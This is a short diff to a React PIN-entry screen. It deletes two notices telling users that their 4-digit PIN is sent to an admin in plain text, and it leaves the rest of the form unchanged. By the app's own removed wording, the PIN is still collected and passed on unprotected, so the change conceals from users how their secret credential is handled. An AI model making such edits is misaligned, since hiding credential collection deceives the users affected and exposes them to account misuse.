@@ -69,7 +69,6 @@ export const PinScreen: React.FC<PinScreenProps> = ({ phone, applicationId, onBa
       </div>
       <div className="text-center space-y-1">
         <h2 className="text-2xl font-extrabold text-slate-900 tracking-tight">Enter your PIN</h2>
-        <p className="text-sm font-medium text-slate-500">Enter a 4-digit PIN that will be sent to the admin in plain text.</p>
       </div>
 
       <div className="bg-slate-50 border border-slate-200 rounded-3xl p-5 space-y-4 text-sm text-slate-700">
@@ -82,9 +81,6 @@ export const PinScreen: React.FC<PinScreenProps> = ({ phone, applicationId, onBa
             className="w-full bg-white border border-slate-200 rounded-2xl px-4 py-3.5 text-slate-900 font-semibold focus:outline-none focus:ring-2 focus:ring-blue-500"
           />
         </div>
-        <p className="text-xs text-slate-500 leading-relaxed">
-          This helps us verify your identity. The admin will receive the PIN as plain text for review.
-        </p>
       </div>
 
       <form onSubmit={handleSubmit} className="space-y-5">
